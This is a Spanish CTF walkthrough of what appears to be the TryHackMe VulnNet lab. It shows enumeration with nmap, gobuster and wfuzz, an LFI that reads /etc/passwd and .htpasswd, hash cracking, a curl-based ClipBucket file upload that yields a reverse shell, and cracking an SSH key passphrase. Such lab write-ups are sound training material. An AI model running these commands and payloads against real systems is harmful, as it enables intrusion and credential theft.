
# SCAN+
```
PORT   STATE SERVICE VERSION                                                                                                                                 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
# WEB ENUM

## DIRECTORIES

Utilizando gobuster para buscar directorios encontramos los directorios comunes:
```
gobuster dir -u vulnnet.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 50
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://vulnnet.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/08/12 11:54:42 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/css/]
/js                   (Status: 301) [Size: 307] [--> http://vulnnet.thm/js/] 
/img                  (Status: 301) [Size: 308] [--> http://vulnnet.thm/img/]
/fonts                (Status: 301) [Size: 310] [--> http://vulnnet.thm/fonts/]
                                                                               
===============================================================
2022/08/12 11:56:03 Finished
===============================================================

```
## SUBDOMAINS

```
gobuster vhost -u vulnnet.thm -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 40
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://vulnnet.thm
[+] Method:       GET
[+] Threads:      40
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/08/12 11:50:33 Starting gobuster in VHOST enumeration mode
===============================================================
Found: gc._msdcs.vulnnet.thm (Status: 400) [Size: 424]
Found: broadcast.vulnnet.thm (Status: 401) [Size: 468]
Found: _domainkey.vulnnet.thm (Status: 400) [Size: 424]
                                                       
===============================================================
2022/08/12 11:50:59 Finished
===============================================================

```
Buscando subdominios (virtual hosts) tambien mediante gobuster encontramos el subdominio 

## PARAMETROS URL

Podemos utilizar wfuzz para buscar parametros para un posible ataque LFI
```
wfuzz -u vulnnet.thm/index.php?FUZZ=/etc/passwd  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -c --hw 462
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://vulnnet.thm/index.php?FUZZ=/etc/passwd
Total requests: 4712

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000003464:   200        174 L    514 W      7660 Ch     "referer"                                                                                   

Total time: 25.48573
Processed Requests: 4712
Filtered Requests: 4711
Requests/sec.: 184.8877
```
eliminando los paquetes de tamaño 462 W eliminamos los falsos positivos. Luego hemos encontrado una puerta de entrada para un posible
ataque del tipo LFI
> vulnnet.thm/index.php?referer=

# LFI EXPLOIT
Explotando la vulnerabilidad anterior podemos ver en 
> vulnnet.thm/index.php?referer=/etc/apache2/.htpasswd, el siguiente hash:
> developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
explicacion: Apache se puede confirgurar para que un sitio, un subdominio o un directorio tengan acceso restringido solo a algunos usuarios. Para esto hay que configurarlos. La configuración se realiza en varios pasos:
1. Se crea un archivo que por convención se llama .htpasswd (aunque en realidad se puede llamar de cualquier manera) donde se guardan las credenciales en forma:
- username: password
El username va en texto plano y el password en una variante de MD5 llamada crypt propia de apache. Cada credencial esta en una linea. Este fichero se
puede crear "a mano" con un editor de texto, pero es mejor hacerlo con una aplicacion especifica (htpasswd) y es mejor guardarlo en un lugar que no sea accesible desde la web. 
2. Una vez que se ha creado el fichero .htpasswd, debe configurarse el sitio correspondiente que se encuentra en /etc/apache2/sites-available/fichero de la siguiente manera:
```
<VirtualHost *:80>
  ServerAdmin webmaster@localhost
  DocumentRoot /var/www/html/broadcast
  ServerName broadcast.vulnnet.thm
  <Directory "/var/www/html/broadcast">
        AuthType Basic  # Typo de autenticacion. En este caso Basic
        AuthName "broadcast area"
        AuthUserFile /etc/apache2/.htpasswd  # path al fichero donde estan las acreditaciones
        Requiere valid-user
  </Directory>
</Virtualhost>
```

##JtR
> developers:9972761drmfsls

# CVE
Entramos en una pagina donde hay una aplicacion llamada **ClipBucket** que es una aplicacion que nos permite subir fotos y videos tipo youtube
Vemos que para la version 4.0 hay una vulnerabilidad que nos permite RCE, file upload e incluso sqlinjection:
![image](https://user-images.githubusercontent.com/70599089/184412628-ba9e86d3-3021-401a-8dcb-38c032fa0861.png)

Optamos por un file upload utilizando un payload tipo pentestmonkey en curl
> curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://broadcast.vulnnet.thm/actions/beats_uploader.php" -u developers:9972761drmfsls

Con esto conseguimos un reverse-shell para el usuario www-data

## ESCALADA DE PRIVILEGIOS
Utilizando linpeas.sh vemos que existen dos posibles vectores:
1. Nos permite leer un fichero /var/backups/ssh-backup.tar.gz
2. cron job para root

### /var/backups/ssh-backup.tar.gz
Podemos descomprimier este fichero en un directorio que nos permita tambien escribir (como /tmp) ya que necesitamos tambien permiso de escritura
(descomprimir es leer y escribir). Descomprimiendo el fichero, obtenemos un fichero llamado **id_rsa** que es una clave privada. 
Probamos a registrarnos en ssh como el usuario server-management y nos pide un passphrase. Intentamos desencriptar y cracker la clave privada con
ssh2john para obtener un hash a partir de la clave privada y luego intentamos crackear el hash con JtR y obtenemos el siguiente:
> oneTWO3gOyac

que pudiera ser el passphrase que estamos buscando y efectivamente lo es. Asi conseguimos entrar como el usuario **server-management** y conseguimos
el user.txt de forma inmediata

# ROOT
Utilizamos la tecnica de cron job con wildcard

